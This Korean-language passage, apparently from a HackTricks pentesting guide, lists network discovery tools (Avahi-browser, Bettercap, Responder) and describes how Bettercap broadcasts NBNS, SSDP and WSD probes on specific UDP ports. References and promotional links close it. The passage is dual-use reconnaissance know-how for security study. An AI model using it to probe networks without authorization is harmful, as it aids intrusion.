* Avahi-browser (--all)
* Bettercap (net.probe.mdns)
* Responder

### **NBNS (NetBios 이름 서버)**

Bettercap은 이름 "CKAAAAAAAAAAAAAAAAAAAAAAAAAAA"를 요청하기 위해 포트 137/UDP로 패킷을 브로드캐스트합니다.

### **SSDP (간단한 서비스 검색 프로토콜)**

Bettercap은 모든 종류의 서비스를 검색하기 위해 SSDP 패킷을 브로드캐스트합니다 (UDP 포트 1900).

### **WSD (웹 서비스 검색)**

Bettercap은 서비스를 검색하기 위해 WSD 패킷을 브로드캐스트합니다 (UDP 포트 3702).

## 참고 자료

* [https://medium.com/@in9uz/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9](https://medium.com/@in9uz/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9)
* **Network Security Assessment: Know Your Network (3rd edition)**
* **Practical IoT Hacking: The Definitive Guide to Attacking the Internet of Things. By Fotios Chantzis, Ioannis Stais, Paulino Calderon, Evangelos Deirmentzoglou, Beau Wood**
* [https://medium.com/@cursedpkt/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9](https://medium.com/@cursedpkt/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9)

<img src="../../.gitbook/assets/i3.png" alt="" data-size="original">\
**Bug bounty 팁**: **Intigriti에 가입**하여 해커들이 만든 프리미엄 **버그 바운티 플랫폼**을 이용하세요! 오늘 [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks)에서 가입하고 최대 **$100,000**의 바운티를 받으세요!

{% embed url="https://go.intigriti.com/hacktricks" %}

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>로부터 <strong>AWS 해킹을 처음부터 전문가까지 배워보세요</strong>!</summary>

HackTricks를 지원하는 다른 방법:

* **회사를 HackTricks에서 광고하거나 HackTricks를 PDF로 다운로드**하려면 [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)를 확인하세요!
* [**공식 PEASS & HackTricks 스웨그**](https://peass.creator-spring.com)를 얻으세요.
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요. 독점적인 [**NFTs**](https://opensea.io/collection/the-peass-family) 컬렉션입니다.
* 💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **참여**하거나 **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**를** 팔로우하세요.
* **HackTricks**와 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github 저장소에 PR을 제출하여 여러분의 해킹 기법을 공유하세요.

</details>
